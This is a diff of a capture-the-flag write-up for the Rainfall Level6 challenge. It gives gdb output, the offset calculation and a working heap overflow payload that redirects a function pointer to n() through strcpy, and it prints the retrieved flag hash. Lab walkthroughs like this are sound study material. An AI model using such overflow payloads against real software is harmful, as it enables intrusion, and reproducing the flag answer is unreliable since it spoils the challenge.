@@ -1,3 +1,7 @@
+# Rainfall
+
+## Level6
+
 ```sh
 (gdb) info functions
 All defined functions:
@@ -89,27 +93,18 @@ Dump of assembler code for function n:
 End of assembler dump.
 ```
 
-We are gonna exploit the function strcpy used in main and overflow it to call the function n
+We are gonna exploit the function `strcpy` used in main and overflow it to call the function `n`
+
+We already know that the buffer is located at `esp + 0x1c` on the stack and the function pointer at `esp + 0x18` in the stack, we now need to calculate the gap between the heap addresses they each store
 
 ```sh
-junya in ~/projects/42/cybersec/RainFall/level1/Ressources on main ● λ python3 cyclic.py 100              
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+(gdb) p *(int *)($esp+0x18) - *(int *)($esp+0x1c) # Recast to pointer and de-reference to retrieve the address they hold
+$1 = 72
 ```
 
-```sh
-(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41346341 in ?? ()
-```
+We can now build our payload by using `72` padding character and the `n()` function address that will replace the `m()` function address currently held by our function pointer
 
 ```sh
-junya in ~/projects/42/cybersec/RainFall/level1/Ressources on main ● λ python3 cyclic.py 100 0x41346341
-Needle 'Ac4A' found at offset: 72
-```
-
-```sh
-./level6 `python -c "print('A' * 72 + '\x54\x84\x04\x08')"`
+level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
